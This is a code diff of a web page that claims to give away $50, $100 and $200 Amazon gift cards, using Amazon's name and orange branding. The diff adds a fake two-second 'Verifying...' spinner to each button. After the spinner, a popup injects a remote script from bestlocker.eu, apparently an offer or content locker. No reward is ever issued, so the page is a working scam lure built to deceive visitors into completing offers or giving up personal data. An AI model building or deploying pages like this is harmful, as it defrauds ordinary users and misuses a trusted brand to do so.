@@ -5,57 +5,27 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Amazon Gift Card Rewards</title>
   <style>
-    /* Background Aurora + Snow */
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: linear-gradient(270deg, #ff9a9e, #fad0c4, #fbc2eb, #a1c4fd, #c2e9fb);
-      background-size: 1200% 1200%;
-      animation: aurora 30s ease infinite;
+      background: #111;
       overflow-x: hidden;
-    }
-    @keyframes aurora {
-      0%{background-position:0% 50%}
-      50%{background-position:100% 50%}
-      100%{background-position:0% 50%}
+      height: 100vh;
+      color: #fff;
     }
 
-    /* Snow effect */
-    .snow {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      pointer-events: none;
-      background-image: url('https://i.ibb.co/GJqC3xT/snow.png');
-      animation: snow 20s linear infinite;
-      z-index: 1;
-    }
-    @keyframes snow {
-      from {background-position: 0 0;}
-      to {background-position: 0 1000px;}
-    }
-
-    /* Container */
     .container {
       position: relative;
-      z-index: 2;
       text-align: center;
       padding: 40px 20px;
+      z-index: 2;
     }
 
-    /* Title with rainbow glow */
     h1 {
-      font-size: 2.5rem;
+      font-size: 2rem;
       color: #fff;
-      text-shadow: 0 0 15px #fff;
-      background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet, red);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: rainbowText 5s linear infinite;
-    }
-    @keyframes rainbowText {
-      0% { background-position: 0% 50%; }
-      100% { background-position: 100% 50%; }
+      margin-bottom: 30px;
+      text-shadow: 0 0 15px #ff9900;
     }
 
     /* Card Grid */
@@ -73,47 +43,23 @@
       border-radius: 20px;
       background: rgba(255,255,255,0.1);
       backdrop-filter: blur(10px);
-      box-shadow: 0 0 15px rgba(255,255,255,0.4);
-      border: 2px solid transparent;
-      background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)),
-        linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet, red);
-      background-origin: border-box;
-      background-clip: content-box, border-box;
-      animation: rainbowBorder 8s linear infinite;
-      color: #fff;
+      border: 2px solid rgba(255,153,0,0.7);
+      box-shadow: 0 4px 15px rgba(255,153,0,0.3);
+      transition: transform 0.3s;
       cursor: pointer;
-      overflow: hidden;
     }
-    @keyframes rainbowBorder {
-      0% { background-position: 0% 50%; }
-      100% { background-position: 200% 50%; }
-    }
-
-    /* Frost Shine animation */
-    .card::after {
-      content: "";
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: linear-gradient(120deg, rgba(255,255,255,0.3) 0%, rgba(255,255,255,0) 60%);
-      transform: rotate(25deg);
-      animation: shine 5s infinite;
-    }
-    @keyframes shine {
-      0% { transform: translateX(-100%) rotate(25deg); }
-      100% { transform: translateX(100%) rotate(25deg); }
+    .card:hover {
+      transform: translateY(-5px);
     }
 
     .card h2 {
       font-size: 1.3rem;
       margin: 10px 0;
-      color: #FF9900; /* Amazon orange */
+      color: #FF9900;
     }
     .card p {
       font-size: 1rem;
-      color: #ddd;
+      color: #fff;
     }
 
     /* Verify Button */
@@ -128,15 +74,31 @@
       color: #111;
       font-weight: bold;
       cursor: pointer;
-      box-shadow: 0 0 15px rgba(255,153,0,0.7);
+      box-shadow: 0 0 15px rgba(255,153,0,0.6);
       transition: all 0.3s;
     }
     .verify-btn:hover {
       background: #e68a00;
-      box-shadow: 0 0 25px rgba(255,153,0,1);
     }
 
-    /* Popup */
+    /* Loading Spinner */
+    .loading {
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #FF9900;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Popup Glassmorphism */
     .popup {
       display: none;
       position: fixed;
@@ -144,28 +106,22 @@
       top: 0; left: 0;
       width: 100%; height: 100%;
       background: rgba(0,0,0,0.7);
-      backdrop-filter: blur(6px);
+      backdrop-filter: blur(8px);
     }
     .popup-content {
       background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(20px);
+      border: 2px solid;
+      border-image: linear-gradient(45deg, #ff9900, #ff00ff, #00ffff) 1;
       border-radius: 20px;
       width: 90%;
       max-width: 500px;
       margin: 8% auto;
       padding: 20px;
       position: relative;
-      box-shadow: 0 0 25px rgba(255,255,255,0.6);
-      border: 2px solid transparent;
-      background-image: linear-gradient(rgba(255,255,255,0.05), rgba(255,255,255,0.05)),
-        linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet, red);
-      background-origin: border-box;
-      background-clip: content-box, border-box;
-      animation: rainbowPopup 8s linear infinite;
+      box-shadow: 0 0 25px rgba(255,153,0,0.5);
       color: #fff;
-    }
-    @keyframes rainbowPopup {
-      0% { background-position: 0% 50%; }
-      100% { background-position: 200% 50%; }
+      text-align: center;
     }
     .close-btn {
       position: absolute;
@@ -174,23 +130,43 @@
       font-weight: bold;
       color: #fff;
       cursor: pointer;
+      text-shadow: 0 0 10px #ff9900;
+    }
+
+    /* Snow / Paper / Fire Particles */
+    .particle {
+      position: fixed;
+      top: -10px;
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 1;
+      animation: fall linear infinite;
+    }
+    @keyframes fall {
+      0% { transform: translateY(0) translateX(0) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(100vh) translateX(50px) rotate(360deg); opacity: 0; }
     }
   </style>
 </head>
 <body>
-  <div class="snow"></div>
   <div class="container">
     <h1>🎁 Claim Your Amazon Gift Card</h1>
     <div class="cards">
       <div class="card">
-        <h2>$100 Amazon Gift Card</h2>
+        <h2>$50 Amazon Gift Card</h2>
         <p>Unlock this reward instantly</p>
-        <button class="verify-btn" onclick="openVerifyPopup()">Verify Now</button>
+        <button class="verify-btn" onclick="startVerification(this)">Verify Now</button>
+      </div>
+      <div class="card">
+        <h2>$100 Amazon Gift Card</h2>
+        <p>Exclusive limited-time reward</p>
+        <button class="verify-btn" onclick="startVerification(this)">Verify Now</button>
       </div>
       <div class="card">
         <h2>$200 Amazon Gift Card</h2>
-        <p>Exclusive limited-time reward</p>
-        <button class="verify-btn" onclick="openVerifyPopup()">Verify Now</button>
+        <p>Premium reward for VIP users</p>
+        <button class="verify-btn" onclick="startVerification(this)">Verify Now</button>
       </div>
     </div>
   </div>
@@ -204,19 +180,28 @@
   </div>
 
   <script>
+    // Loading then open popup
+    function startVerification(btn) {
+      btn.disabled = true;
+      let originalText = btn.innerHTML;
+      btn.innerHTML = '<span class="loading"></span> Verifying...';
+
+      setTimeout(() => {
+        btn.innerHTML = originalText;
+        btn.disabled = false;
+        openVerifyPopup();
+      }, 2000); // 2 sec loading
+    }
+
     // Open popup + inject script dynamically
     function openVerifyPopup() {
       document.getElementById("verifyPopup").style.display = "block";
-
-      // Clear old script
       document.getElementById("verify-box").innerHTML = "";
 
       // Create new script tag
       var s = document.createElement("script");
       s.type = "text/javascript";
       s.src = "https://bestlocker.eu/iframeLoader/9c03b476-84b9-11f0-948d-8a5fb7be40ea";
-      s.onload = () => console.log("Locker Loaded ✅");
-      s.onerror = () => console.log("⚠️ Locker Failed to Load");
       document.getElementById("verify-box").appendChild(s);
     }
 
@@ -225,6 +210,39 @@
       document.getElementById("verifyPopup").style.display = "none";
       document.getElementById("verify-box").innerHTML = "";
     };
+
+    // Generate Snow + Paper + Fire Particles
+    function createParticle(type) {
+      const p = document.createElement("div");
+      p.classList.add("particle");
+
+      if (type === "snow") {
+        p.style.background = "white";
+        p.style.width = p.style.height = Math.random()*5+3 + "px";
+        p.style.animationDuration = Math.random()*5+5 + "s";
+      } 
+      else if (type === "paper") {
+        p.style.width = "10px";
+        p.style.height = "14px";
+        p.style.background = "#f5deb3"; /* light paper */
+        p.style.animationDuration = Math.random()*6+6 + "s";
+      } 
+      else if (type === "fire") {
+        p.style.background = "orange";
+        p.style.width = p.style.height = Math.random()*4+2 + "px";
+        p.style.boxShadow = "0 0 10px red";
+        p.style.animationDuration = Math.random()*3+3 + "s";
+      }
+
+      p.style.left = Math.random()*100 + "vw";
+      document.body.appendChild(p);
+
+      setTimeout(()=> p.remove(), 12000);
+    }
+
+    setInterval(()=> createParticle("snow"), 500);
+    setInterval(()=> createParticle("paper"), 1200);
+    setInterval(()=> createParticle("fire"), 800);
   </script>
 </body>
 </html>
